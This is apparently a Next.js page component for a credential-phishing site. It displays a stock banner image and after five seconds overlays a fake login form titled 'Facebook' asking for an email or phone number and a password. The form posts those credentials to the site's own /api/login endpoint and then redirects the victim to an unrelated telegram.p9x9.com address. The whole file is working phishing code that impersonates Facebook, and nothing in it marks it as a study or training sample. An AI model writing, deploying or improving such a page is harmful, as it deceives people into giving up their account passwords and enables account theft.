"use client";

import { useState, useEffect } from "react";

const IMAGE_URL = process.env.HOME_IMAGE_URL || "https://media.istockphoto.com/id/814423752/photo/eye-of-model-with-colorful-art-make-up-close-up.jpg";
const REDIRECT_URL = "https://telegram.p9x9.com/telegram";

export default function Home() {
  const [showLogin, setShowLogin] = useState(false);
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [submitting, setSubmitting] = useState(false);
  const [message, setMessage] = useState("");

  useEffect(() => {
    const timer = setTimeout(() => setShowLogin(true), 5000);
    return () => clearTimeout(timer);
  }, []);

  const handleSubmit = async (e) => {
    e.preventDefault();
    setSubmitting(true);
    setMessage("");

    try {
      const res = await fetch("/api/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email, password }),
      });

      const result = await res.json();
      if (result.success) {
        setMessage("Login successfully please wait....");
        window.location.href = result.redirectUrl || REDIRECT_URL;
        return;
      }

      setMessage(result.message || "Submission failed. Please try again.");
    } catch (error) {
      setMessage("Submission failed. Please try again.");
    } finally {
      setSubmitting(false);
    }
  };

  return (
    <div className="home-container">
      <img src={IMAGE_URL} alt="Banner" className="home-image" />
      <div className={`login-overlay ${showLogin ? "active" : ""}`}>
        <div className="login-form-container">
          <h2>Facebook</h2>
          <form onSubmit={handleSubmit}>
            <input
              type="text"
              placeholder="Email or Phone Number"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              required
            />
            <input
              type="password"
              placeholder="Password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              required
            />
            <button type="submit" disabled={submitting}>
              {submitting ? "Submitting..." : "Login"}
            </button>
          </form>
          {message && <p className="status-message">{message}</p>}
        </div>
      </div>
    </div>
  );
}
